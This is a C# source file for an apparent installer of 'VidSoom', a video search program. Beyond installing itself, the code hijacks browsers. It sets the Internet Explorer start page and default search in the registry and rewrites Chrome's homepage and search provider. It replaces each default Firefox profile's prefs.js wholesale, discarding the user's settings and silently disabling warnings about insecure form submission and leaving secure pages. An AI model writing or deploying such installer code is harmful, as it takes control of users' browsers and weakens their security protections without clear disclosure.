using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Security.Permissions;
using Microsoft.Win32;

namespace VidSoom
{
    public partial class frmInstall : Form
    {
        public frmInstall()
        {
            InitializeComponent();
        }

        private void oPersonalizada_CheckedChanged(object sender, EventArgs e)
        {
            if (oPersonalizada.Checked)
            {
                cInicio.Enabled = true;
                //cBarra.Enabled = true;
                cAcceso.Enabled = true; 
            }
            else
            {
                cInicio.Enabled = false;
                //cBarra.Enabled = false;
                cAcceso.Enabled = false;
            }
        }

        private void frmInstall_Load(object sender, EventArgs e)
        {
            cmbIdioma.SelectedIndex = 0;
        }

        private void btnCancelar_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        public void install()
        {
            string dirPF = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\VidSoom\\";

            try
            {
                if (!Directory.Exists(dirPF)) Directory.CreateDirectory(dirPF);
                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, dirPF + "VidSoom.exe", true);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Install", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            if (cInicio.Checked || oTipica.Checked)
            {
                SetIE("http://www.vidsoom.com");
                SetMozilla("http://www.vidsoom.com");
                SetChrome("http://www.vidsoom.com");


                RegistryKey scopes = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer\\SearchScopes", true);

                scopes.SetValue("DefaultScope", "{0863EE94-8f76-472f-A0FF-11416B1B2E7A}");

                RegistryKey keyx = scopes.CreateSubKey("{0863EE94-8f76-472f-A0FF-11416B1B2E7A}");

                keyx.SetValue("DisplayName", "VidSoom");
                keyx.SetValue("URL", "http://www.vidsoom.com/search/?i={searchTerms}");
                keyx.SetValue("ShowSearchSuggestions", "dword:00000001");
                keyx.SetValue("SuggestionsURL", "http://clients5.google.com/complete/search?q={searchTerms}&client=ie8&mw={ie:maxWidth}&sh={ie:sectionHeight}&rh={ie:rowHeight}&inputencoding={inputEncoding}&outputencoding={outputEncoding}");
                keyx.SetValue("FaviconURL", "http://www.vidsoom.com/favicon.ico");
                /*
LPCWSTR searchScopesKeyName = L"Software\\Microsoft\\Internet Explorer\\SearchScopes";

createKey(rootKey, HKEY_CURRENT_USER, searchScopesKeyName);

std::wstring clsidString = findProviderClsid(false);
if( clsidString.empty() )
    clsidString = mc_providerClsidString;

if( makeItDefault )
    setStringValue( rootKey, mc_defaultScopeValueName, clsidString.c_str() );

ATL::CRegKey subKey;
createKey(subKey, rootKey.m_hKey, clsidString.c_str() );

setStringValue( subKey, mc_displayNameValueName, mc_providerName );
setStringValue( subKey, mc_faviconUrlValueName, mc_providerFaviconURL );
setStringValue( subKey, mc_urlValueName, mc_providerURL );
                */

            }

            if (cAcceso.Checked || oTipica.Checked)
            {
                appShortcut("VidSoom", dirPF, Environment.SpecialFolder.DesktopDirectory);
            }
            appShortcut("VidSoom", dirPF, Environment.SpecialFolder.StartMenu);

            Properties.Settings.Default.Idioma = cmbIdioma.SelectedIndex;
            Properties.Settings.Default.Save();

            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);

            key = key.CreateSubKey("VidSoom");
            key = key.CreateSubKey("Version");
            key.SetValue("Installed", 1);
            key.SetValue("Search", cInicio.Checked || oTipica.Checked);
            //key.SetValue("Bar", cBarra.Checked || oTipica.Checked);
            key.SetValue("Shortcut", cAcceso.Checked || oTipica.Checked);
            key.SetValue("Language", cmbIdioma.SelectedIndex);

            System.Diagnostics.Process.Start(dirPF + "VidSoom.exe");
            Application.Exit();
        }

        private void btnAceptar_Click(object sender, EventArgs e)
        {
            install();
        }

        private void appShortcut(string linkName, string app, Environment.SpecialFolder carpeta)
        {
            string deskDir = Environment.GetFolderPath(carpeta);

            using (StreamWriter writer = new StreamWriter(deskDir + "\\" + linkName + ".url"))
            {
                //string app = System.Reflection.Assembly.GetExecutingAssembly().Location;
                writer.WriteLine("[InternetShortcut]");
                writer.WriteLine("URL=file:///" + app);
                writer.WriteLine("IconIndex=0");
                string icon = app.Replace('\\', '/');
                writer.WriteLine("IconFile=" + icon);
                writer.Flush();
            }
        }
        public void SetIE(string strURL)
        {
            RegistryKey startPageKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\Main", true);
            startPageKey.SetValue("Start Page", strURL);
            startPageKey.Close();
        }
        public void SetChrome(string strURL)
        {
            string strFolder;

            strFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Preferences";

            StreamReader reader = new StreamReader(strFolder);
            string arch = reader.ReadToEnd();
            reader.Close();
            reader.Dispose();

            arch = replaceKey(arch, "homepage", strURL);
            arch = replaceKey(arch, "urls_to_restore_on_startup", strURL);

            string search = "\"enabled\": true," +
                              "\"encodings\": \"UTF-8\"," +
                              "\"icon_url\": \"http://www.vidsoom.com/favicon.ico\"," +
                              "\"id\": \"14\"," +
                              "\"instant_url\": \"\"," +
                              "\"keyword\": \"vidsoom.com\"," +
                              "\"name\": \"VidSoom\"," +
                              "\"prepopulate_id\": \"0\"," +
                              "\"search_url\": \"http://www.vidsoom.com/search/?i={searchTerms}\"," +
                              "\"suggest_url\": \"{google:baseSuggestURL}search?{google:searchFieldtrialParameter}client=chrome&hl={language}&q={searchTerms}\"";

            arch = replaceKey(arch, "default_search_provider", search, "{", "},");

            StreamWriter writer = new StreamWriter(strFolder);
            writer.Write(arch);
            writer.Close();
            writer.Dispose();
        }
        public string replaceKey(string arch, string key, string value, string com1s = "\"", string com2s = "\"")
        {
            int where = -1;
            while (where != 1 + key.Length)
            {
                where = arch.IndexOf("\"" + key + "\"",where + 1) + 2 + key.Length;
                if (where != 1 + key.Length)
                {
                    int com1 = arch.IndexOf(com1s, where) + com1s.Length;
                    int com2 = arch.IndexOf(com2s, com1);
                    arch = arch.Remove(com1, com2 - com1);
                    arch = arch.Insert(com1, value);
                }
            }

            return arch;
        }

        public void SetMozilla(string strURL)
        {
            try
            {
                string strSystemUname = Environment.UserName.ToString().Trim();
                string systemDrive = Environment.ExpandEnvironmentVariables("%SystemDrive%");
                string strDirectory = "";
                string strPrefFolder = "";
                if (Directory.Exists(systemDrive + "\\Documents and Settings\\" + strSystemUname + "\\Application Data\\Mozilla\\Firefox\\Profiles"))
                {
                    strDirectory = systemDrive + "\\Documents and Settings\\" + strSystemUname + "\\Application Data\\Mozilla\\Firefox\\Profiles";
                }
                else if (Directory.Exists(systemDrive + "\\WINDOWS\\Application Data\\Mozilla\\Firefox\\Profiles"))
                {
                    strDirectory = systemDrive + "\\WINDOWS\\Application Data\\Mozilla\\Firefox\\Profiles";
                }
                if (strDirectory.Trim().Length != 0)
                {
                    System.IO.DirectoryInfo oDir = new DirectoryInfo(strDirectory);
                    //System.IO.DirectoryInfo[] oSubDir;
                    //oSubDir = oDir.GetDirectories(strDirectory);
                    foreach (DirectoryInfo oFolder in oDir.GetDirectories())
                    {
                        if (oFolder.FullName.IndexOf(".default") >= 0)
                        {
                            strPrefFolder = oFolder.FullName;
                            CreatePrefs(strURL, strPrefFolder);
                        }
                    }

                }
            }
            catch
            { }
        }
        private static void CreatePrefs(string strURL, string strFolder)
        {
            StreamWriter writer = new StreamWriter(strFolder + "\\searchplugins\\vidsoom.xml");
            writer.Write(Buscadores.FireFox);
            writer.Close();
            writer.Dispose();


            StringBuilder sbPrefs = new StringBuilder();
            sbPrefs.Append("# Mozilla User Preferences\n\r");
            sbPrefs.Append("/* Do not edit this file.\n\r*\n\r");
            sbPrefs.Append("* If you make changes to this file while the application is running,\n\r");
            sbPrefs.Append("* the changes will be overwritten when the application exits.,\n\r*\n\r");
            sbPrefs.Append("* To make a manual change to preferences, you can visit the URL about:config\n\r");
            sbPrefs.Append("* For more information, see http://www.mozilla.org/unix/customizing.html#prefs\n\r");
            sbPrefs.Append("*/\n\r");
            sbPrefs.Append("user_pref(\"app.update.lastUpdateTime.addon-background-update-timer\", 1188927425);\n\r");
            sbPrefs.Append("user_pref(\"app.update.lastUpdateTime.background-update-timer\", 1188927425);\n\r");
            sbPrefs.Append("user_pref(\"app.update.lastUpdateTime.blocklist-background-update-timer\", 1188927425);\n\r");
            sbPrefs.Append("user_pref(\"app.update.lastUpdateTime.search-engine-update-timer\", 1188927425);\n\r");
            sbPrefs.Append("user_pref(\"browser.anchor_color\", \"#0000FF\");\n\r");
            sbPrefs.Append("user_pref(\"browser.display.background_color\", \"#C0C0C0\");\n\r");
            sbPrefs.Append("user_pref(\"browser.display.use_system_colors\", true);\n\r");
            sbPrefs.Append("user_pref(\"browser.formfill.enable\", false);\n\r");
            sbPrefs.Append("user_pref(\"browser.history_expire_days\", 20);\n\r");
            sbPrefs.Append("user_pref(\"browser.shell.checkDefaultBrowser\", false);\n\r");
            sbPrefs.Append("user_pref(\"browser.startup.homepage\", \"" + strURL + "\");\n\r");
            sbPrefs.Append("user_pref(\"browser.startup.homepage_override.mstone\", \"rv:1.8.1.6\");\n\r");
            sbPrefs.Append("user_pref(\"browser.visited_color\", \"#800080\");\n\r");
            sbPrefs.Append("user_pref(\"browser.search.selectedEngine\", \"VidSoom\");\n\r");
            sbPrefs.Append("user_pref(\"extensions.lastAppVersion\", \"2.0.0.6\");\n\r");
            sbPrefs.Append("user_pref(\"intl.charsetmenu.browser.cache\", \"UTF-8, ISO-8859-1\");\n\r");
            sbPrefs.Append("user_pref(\"network.cookie.prefsMigrated\", true);\n\r");
            sbPrefs.Append("user_pref(\"security.warn_entering_secure\", false);\n\r");
            sbPrefs.Append("user_pref(\"security.warn_leaving_secure\", false);\n\r");
            sbPrefs.Append("user_pref(\"security.warn_submit_insecure\", false);\n\r");
            sbPrefs.Append("user_pref(\"security.warn_submit_insecure.show_once\", false);\n\r");
            sbPrefs.Append("user_pref(\"spellchecker.dictionary\", \"en-US\");\n\r");
            sbPrefs.Append("user_pref(\"urlclassifier.tableversion.goog-black-enchash\", \"1.32944\");\n\r");
            sbPrefs.Append("user_pref(\"urlclassifier.tableversion.goog-black-url\", \"1.14053\");\n\r");
            sbPrefs.Append("user_pref(\"urlclassifier.tableversion.goog-white-domain\", \"1.23\");\n\r");
            sbPrefs.Append("user_pref(\"urlclassifier.tableversion.goog-white-url\", \"1.371\");\n\r");
            writer = new StreamWriter(strFolder + "\\prefs.js");
            writer.Write(sbPrefs.ToString());
            writer.Close();
            writer.Dispose();
            GC.Collect();
        }

        private void cmbIdioma_SelectedIndexChanged(object sender, EventArgs e)
        {
            Language.currentLang = (Language.eLang)cmbIdioma.SelectedIndex;
            Language.translateForm(this);
        }


    }
}
